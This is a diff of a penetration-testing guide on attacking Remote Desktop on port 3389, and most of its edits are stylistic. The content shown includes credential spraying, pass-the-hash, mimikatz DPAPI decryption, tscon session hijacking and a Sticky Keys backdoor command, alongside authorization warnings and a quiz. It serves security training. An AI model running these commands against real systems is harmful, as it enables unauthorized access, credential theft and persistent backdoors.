@@ -1,9 +1,9 @@
 ---
 title: RDP - Port 3389
-description: Enumeration and attack methodology for Remote Desktop Protocol on port 3389, covering pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking.
+description: "Enumerate and attack Remote Desktop Protocol on port 3389. Cover pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
 openGraph:
   title: "RDP - Port 3389"
-  description: "Enumeration and attack methodology for Remote Desktop Protocol on port 3389, covering pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
+  description: "Enumerate and attack Remote Desktop Protocol on port 3389. Cover pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
   images:
     - url: /imgs/rdp.jpg
       width: 1672
@@ -13,7 +13,7 @@ openGraph:
 twitter:
   card: summary_large_image
   title: "RDP - Port 3389"
-  description: "Enumeration and attack methodology for Remote Desktop Protocol on port 3389, covering pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
+  description: "Enumerate and attack Remote Desktop Protocol on port 3389. Cover pre-auth intelligence, NLA and encryption checks, credential spraying, pass-the-hash, pass-the-ticket, file transfer, and session hijacking."
   images:
     - url: /imgs/rdp.jpg
       width: 1672
@@ -84,7 +84,7 @@ nmap --script rdp-enum-encryption -p3389 <IP>
 - [ ] `nmap -sV -sC -p3389 <IP>` confirm RDP and capture the OS hint.
 - [ ] `nmap --script rdp-ntlm-info -p3389 <IP>` **the single highest-value RDP recon command**. Returns NetBIOS name, NetBIOS domain, DNS domain, FQDN, nd OS build, all unauthenticated. This seeds the entire AD enumeration phase: you learn the domain before sending a single LDAP query.
 - [ ] `nmap --script rdp-enum-encryption -p3389 <IP>` surfaces the accepted security layers. Note NLA support and whether legacy `RDP` encryption is still allowed.
-- [ ] Record the **NLA posture**: enforced means credentials must be valid before any session (PtH needs Restricted Admin Mode; brute force is high-cost); optional/disabled means clients can drop to a graphical login screen that is brute-forceable and may leak usernames.
+- [ ] Record the **NLA posture**: enforced means credentials must be valid before any session (PtH needs Restricted Admin Mode. Brute force is high-cost). Optional/disabled means clients can drop to a graphical login screen that is brute-forceable and may leak usernames.
 - [ ] Store the disclosed FQDN `xfreerdp3` against an IP forces NTLM, against an FQDN allows Kerberos.
 
 ### Phase 2: Vulnerability Assessment
@@ -107,10 +107,10 @@ msfconsole -q -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOSTS <
 
 - [ ] `nmap --script rdp-vuln-ms12-020 -p3389 <IP>` MS12-020 is DoS-only (BSOD), but its presence flags an unpatched ancient host with everything that implies.
 - [ ] Run the BlueKeep **scanner** module (CVE-2019-0708). Vulnerable: Windows XP/Vista/7, Server 2003/2008/2008 R2. DejaBlue (CVE-2019-1181/1182) extends the family through Windows 10 / Server 2019.
-- [ ] If a BlueKeep-family vuln is confirmed, **document the Critical finding and stop**. The scanner is safe; the exploit is not do not run it on a production host without explicit written authorization for that host.
+- [ ] If a BlueKeep-family vuln is confirmed, **document the Critical finding and stop**. The scanner is safe. The exploit is not do not run it on a production host without explicit written authorization for that host.
 
 <Callout type="warning">
-**BlueKeep exploitation has a real BSOD risk.** The Metasploit exploit targets a heap layout that varies by exact build; getting it wrong crashes the kernel and can take a production server offline. The scanner finding alone is a Critical report item you do not need a working shell to make the case. Reserve the exploit for lab/CTF/authorized destructive-test windows.
+**BlueKeep exploitation has a real BSOD risk.** The Metasploit exploit targets a heap layout that varies by exact build. Getting it wrong crashes the kernel and can take a production server offline. The scanner finding alone is a Critical report item you do not need a working shell to make the case. Reserve the exploit for lab/CTF/authorized destructive-test windows.
 </Callout>
 
 
@@ -135,9 +135,9 @@ nxc rdp <IP> -u <USER> -p <PASS> --screenshot     # validate + capture desktop
 crowbar -b rdp -s <IP>/32 -u <USER> -C passwords.txt
 ```
 
-- [ ] `nxc rdp <IP> -u <USER> -p <PASS>`  RDP is one of the highest-value reuse targets; admins routinely reuse the same password across SMB, WinRM, and RDP.
+- [ ] `nxc rdp <IP> -u <USER> -p <PASS>`  RDP is one of the highest-value reuse targets. Admins routinely reuse the same password across SMB, WinRM, and RDP.
 - [ ] `nxc rdp <IP> -u users.txt -p '<PASS>'` single-password spray is the safest pattern against AD lockouts.
-- [ ] `nxc rdp <SUBNET>/24 -u <USER> -p <PASS>` find every host that accepts the credential in one shot; one credential often unlocks ten or more hosts on a flat network.
+- [ ] `nxc rdp <SUBNET>/24 -u <USER> -p <PASS>` find every host that accepts the credential in one shot. One credential often unlocks ten or more hosts on a flat network.
 - [ ] `nxc rdp <IP> -u <USER> -p <PASS> --screenshot` confirm the credential and capture the post-login desktop without opening a full interactive session (clean evidence, minimal OPSEC).
 - [ ] Brute force (`crowbar`/`hydra`) only if NLA is off and lockouts are confirmed safe. Crowbar implements the protocol natively and is more reliable than Hydra for RDP.
 
@@ -172,12 +172,12 @@ reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestric
 ```
 
 - [ ] `nxc rdp <IP> -u <USER> -H <HASH>` validate the hash before attempting an interactive PtH connection.
-- [ ] `xfreerdp3 /u:<USER> /pth:<HASH> /v:<IP> /cert:ignore` works **only** when Restricted Admin Mode is enabled on the target (`DisableRestrictedAdmin = 0`). NLA does not block PtH; the missing RAM key does.
+- [ ] `xfreerdp3 /u:<USER> /pth:<HASH> /v:<IP> /cert:ignore` works **only** when Restricted Admin Mode is enabled on the target (`DisableRestrictedAdmin = 0`). NLA does not block PtH. The missing RAM key does.
 - [ ] If you already have admin via WinRM/psexec/SMB, flip the RAM registry key yourself, then reconnect via PtH.
 - [ ] Prefer **Pass-the-Ticket** (`KRB5CCNAME=...ccache xfreerdp3 /u:<USER> /v:<FQDN> /sec:nla`): it works without Restricted Admin Mode, leaves the session fully credentialed for further lateral movement, and produces Kerberos logs rather than conspicuous NTLM.
 
 <Callout type="info">
-Restricted Admin Mode is **disabled by default** on every modern Windows release. In a real environment, PtH over RDP almost always fails on the first try and succeeds via Kerberos PtT instead   assume you will either enable RAM yourself (needs another foothold) or pivot to a ticket.
+Restricted Admin Mode is **disabled by default** on every modern Windows release. In a real environment, PtH over RDP almost always fails on the first try and succeeds via Kerberos PtT instead. Assume you will either enable RAM yourself (needs another foothold) or pivot to a ticket.
 </Callout>
 
 **Move to Phase 5** once you can authenticate (password, PtH with RAM enabled, or PtT).
@@ -227,10 +227,10 @@ dir /s /b %USERPROFILE%\Documents\*.rdp
 ```
 
 - [ ] `reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"` every key is a host this user RDP'd to, often with a `UsernameHint`. One of the most reliable lateral-movement maps in Windows.
-- [ ] `cmdkey /list` entries in Credential Manager; domain credentials live here when users tick "Remember me". Decrypt the DPAPI blobs in `%LOCALAPPDATA%\Microsoft\Credentials\` with mimikatz `dpapi::cred`.
+- [ ] `cmdkey /list` entries in Credential Manager. Domain credentials live here when users tick "Remember me". Decrypt the DPAPI blobs in `%LOCALAPPDATA%\Microsoft\Credentials\` with mimikatz `dpapi::cred`.
 - [ ] `dir /s /b %USERPROFILE%\Documents\*.rdp` MSTSC profiles, sometimes with DPAPI-encrypted saved passwords.
-- [ ] Because RDP gives a real desktop, launch the user's browser and read saved passwords from the GUI password manager directly  faster than running sharpchrome on a hardened target.
-- [ ] When you hold both RDP *and* WinRM creds for the same target, default to **WinRM via evil-winrm**: faster, scriptable, Logon Type 3 (Network) instead of Type 10 (RemoteInteractive), native file transfer, and no GUI cache artifacts. Use RDP only when you specifically need the GUI Credential Manager UI, browser password manager, a thick-client app, or visual reporting evidence.
+- [ ] Because RDP gives a real desktop, launch the user's browser and read saved passwords from the GUI password manager directly. That is faster than running sharpchrome on a hardened target.
+- [ ] When you hold both RDP *and* WinRM creds for the same target, default to **WinRM via evil-winrm**. It is faster and scriptable. It uses Logon Type 3 (Network) instead of Type 10 (RemoteInteractive), native file transfer, and no GUI cache artifacts. Use RDP only when you specifically need the GUI Credential Manager UI, browser password manager, a thick-client app, or visual reporting evidence.
 
 ### Phase 7: Session Hijacking and Persistence
 
@@ -254,13 +254,13 @@ icacls C:\Windows\System32\sethc.exe /grant administrators:F
 copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
 ```
 
-- [ ] `query user` list every active session; look for other admins logged in.
+- [ ] `query user` list every active session. Look for other admins logged in.
 - [ ] As **SYSTEM**, `tscon <SESSION_ID> /dest:console` hijacks any session with no password, MFA, or UAC prompt you inherit the victim's fully-authenticated desktop. The victim's active session is silently disconnected.
-- [ ] `mstsc /shadow:<SESSION_ID> /control` RDP session shadowing; requires admin and a permissive shadowing GPO.
+- [ ] `mstsc /shadow:<SESSION_ID> /control` RDP session shadowing. Requires admin and a permissive shadowing GPO.
 - [ ] **Sticky Keys / Utilman backdoor**  replace `sethc.exe`/`Utilman.exe` with `cmd.exe` for a pre-auth SYSTEM shell at the login screen that survives reboots and password rotation. Same trick works with `osk.exe`.
 
 <Callout type="warning">
-**OPSEC:** The Sticky Keys / Utilman backdoor is famous and trivially caught by modern EDR and file-integrity monitoring (Sysmon 11 on `sethc.exe`/`Utilman.exe`). Treat it as a known-burned technique unless you have confirmed the environment lacks endpoint protection useful in CTFs and neglected legacy environments, reckless on a monitored networ
+**OPSEC:** The Sticky Keys / Utilman backdoor is famous and trivially caught by modern EDR and file-integrity monitoring (Sysmon 11 on `sethc.exe`/`Utilman.exe`). Treat it as a known-burned technique unless you have confirmed the environment lacks endpoint protection. It is useful in CTFs and neglected legacy environments. It is reckless on a monitored network.
 </Callout>
 
 **Loop back to Phase 3** with any credentials captured here to continue spreading. When you hold the objective or have exhausted reachable hosts, move to reporting.
@@ -274,7 +274,7 @@ copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
     "Run the exploit during off-hours so any BSOD is less impactful"
   ]}
   answer={1}
-  explanation="The Metasploit BlueKeep exploit has a documented BSOD failure mode reliability depends on the exact build, and a wrong heap layout crashes the kernel. On a production file server that means data offline, possible file corruption, and triggered DR procedures. Even with scope permitting exploitation, that risk demands explicit written authorization for the specific host plus a recovery plan. Option 4 does not remove the BSOD risk and may worsen impact if no one is watching. Option 1 is reckless; option 3 misreads the situation since the scanner finding alone is Critical. The right answer is option 2: confirm with the safe scanner, write it up, and pursue other access vectors request explicit authorization with a maintenance window if you later need working RCE to demonstrate impact."
+  explanation="The Metasploit BlueKeep exploit has a documented BSOD failure mode. Reliability depends on the exact build, and a wrong heap layout crashes the kernel. On a production file server that means data offline, possible file corruption, and triggered DR procedures. Even with scope permitting exploitation, that risk demands explicit written authorization for the specific host plus a recovery plan. Option 4 does not remove the BSOD risk and may worsen impact if no one is watching. Option 1 is reckless. Option 3 misreads the situation since the scanner finding alone is Critical. The right answer is option 2: confirm with the safe scanner, write it up, and pursue other access vectors. Request explicit authorization with a maintenance window if you later need working RCE to demonstrate impact."
 />
 
 ## Overview
@@ -333,7 +333,7 @@ PtH over RDP causes more confusion than any other technique because it depends o
 
 ### How PtH over RDP Works
 
-In a normal RDP login, the client sends the cleartext password (or a Kerberos ticket) to the server. PtH submits the NTLM hash directly but RDP's normal flow has no place for a raw hash. **Restricted Admin Mode** changes the protocol: the client uses local credentials (or a hash) to prove identity, and the server creates a session with no network credentials. This is what allows `xfreerdp3 /pth:` to work the client passes the hash to its own SSPI subsystem, which negotiates with the server's CredSSP layer using the hash as the auth material.
+In a normal RDP login, the client sends the cleartext password (or a Kerberos ticket) to the server. PtH submits the NTLM hash directly, but RDP's normal flow has no place for a raw hash. **Restricted Admin Mode** changes the protocol. The client uses local credentials (or a hash) to prove identity, and the server creates a session with no network credentials. This is what allows `xfreerdp3 /pth:` to work. The client passes the hash to its own SSPI subsystem, which negotiates with the server's CredSSP layer using the hash as the auth material.
 
 ### Side Effects of Restricted Admin Mode
 
@@ -342,7 +342,7 @@ In a normal RDP login, the client sends the cleartext password (or a Kerberos ti
 | Network credentials | The session has **no** outbound credentials you cannot authenticate to other resources from inside |
 | Pass-the-hash | Enabled `xfreerdp3 /pth:` works |
 | Single sign-on | Broken no SMB shares, mapped drives, or domain resources from inside |
-| Logging | Logon Type 10 still recorded; the logged-on user is the account whose hash was used |
+| Logging | Logon Type 10 still recorded. The logged-on user is the account whose hash was used |
 | Lateral movement from inside | Must be re-authenticated explicitly with `runas`, token tricks, or fresh creds |
 
 <Callout type="info">
@@ -384,7 +384,7 @@ Pass-the-Ticket (Kerberos) is the cleaner alternative when you have a TGT or ser
 
 ## Session Hijacking and Lateral Movement
 
-Once you have local admin (and thus SYSTEM via `psexec -s`, token theft, or a service install), other users' RDP sessions on the same host become accessible without their passwords.
+Once you have local admin (and thus SYSTEM via `psexec -s`, token theft, or a service install), other users' RDP sessions on the same host become accessible. You do not need their passwords.
 
 ### tscon Session Hijacking
 
@@ -399,7 +399,7 @@ tscon 2 /dest:console     :: hijack alice's session to the local console
 tscon 3 /dest:rdp-tcp#99  :: hijack bob's disconnected session to a new RDP channel
 ```
 
-The hijack is silent for the hijacker   no password prompt, no MFA, no UAC. `tscon` (`%SystemRoot%\System32\tscon.exe`) asks the Terminal Services subsystem to reattach a session to a different console; the only security check is "are you SYSTEM or do you hold `SeTcbPrivilege`?", neither of which needs the target user's password. This was designed for help-desk shadowing.
+The hijack is silent for the hijacker   no password prompt, no MFA, no UAC. `tscon` (`%SystemRoot%\System32\tscon.exe`) asks the Terminal Services subsystem to reattach a session to a different console. The only security check is "are you SYSTEM or do you hold `SeTcbPrivilege`?", neither of which needs the target user's password. This was designed for help-desk shadowing.
 
 ### Sticky Keys / Utilman Backdoor
 
